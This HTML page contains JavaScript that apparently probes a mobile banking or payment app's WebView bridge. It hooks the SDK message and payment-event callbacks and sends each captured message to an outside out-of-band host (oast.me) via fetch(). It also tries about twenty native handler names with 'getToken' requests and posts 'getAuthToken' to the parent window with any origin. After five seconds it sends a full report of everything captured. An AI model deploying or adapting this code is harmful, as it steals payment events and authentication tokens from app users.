  <html>
  <head><title>Hooking...</title></head>
  <body>
  <script>
  var captured = [];

  // Hook the onMessage callback - intercept what native sends to the page
  var origOnMessage = window.__plusSDKMobileCompat.onMessage;
  window.__plusSDKMobileCompat.onMessage = function(msg) {
    captured.push({type: "plusSDK", msg: msg, msgType: typeof msg, str: JSON.stringify(msg)});
    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/native-msg?" + encodeURIComponent(JSON.stringify(msg)));
    if(origOnMessage) return origOnMessage.apply(this, arguments);
  };

  // Hook payment onEvent
  var origOnEvent = window.__webviewPaymentWidget.onEvent;
  window.__webviewPaymentWidget.onEvent = function(evt) {
    captured.push({type: "payment", evt: evt, str: JSON.stringify(evt)});
    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/payment-evt?" + encodeURIComponent(JSON.stringify(evt)));
    if(origOnEvent) return origOnEvent.apply(this, arguments);
  };

  // Now try to SEND messages to native via various methods
  var sendResults = [];

  // Method 1: webkit.messageHandlers with common names
  var tryHandlers = ["plus","plusSDK","sdk","native","bridge","app","message",
    "SmartWebview","smartWebview","webview","PlusHomeSDK","plusHomeSDK",
    "fintech","bank","payment","pay","compat","mobileCompat"];

  tryHandlers.forEach(function(h){
    try {
      window.webkit.messageHandlers[h].postMessage({type:"ping",action:"getToken"});
      sendResults.push(h + ": SENT (no error)");
    } catch(e) {
      if(!e.message.includes("undefined")) sendResults.push(h + ": " + e.message);
    }
  });

  // Method 2: Try postMessage to parent/top
  try {
    window.parent.postMessage({type:"plus-sdk",action:"getAuthToken"}, "*");
    sendResults.push("parent.postMessage: sent");
  } catch(e){}

  // Method 3: Try setting onMessage to trigger a response
  // Some SDKs respond when you assign the callback
  try {
    window.__plusSDKMobileCompat.onMessage({type:"ready"});
    sendResults.push("called own onMessage with ready");
  } catch(e){}

  // Method 4: Try window.location with SDK scheme
  // Don't actually navigate, just log what would happen
  sendResults.push("Would try: ybapp://plus-home-sdk/getToken");

  // Method 5: Custom event dispatch
  try {
    document.dispatchEvent(new CustomEvent("plusSDKReady", {detail:{}}));
    sendResults.push("dispatched plusSDKReady event");
  } catch(e){}

  // Report after 5s (give native time to respond via onMessage)
  setTimeout(function(){
    var report = {
      sendResults: sendResults,
      captured: captured
    };
    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/full-report?" + encodeURIComponent(JSON.stringify(report)));
    document.title = JSON.stringify(report);
  }, 5000);
  </script>
  </body>
  </html>
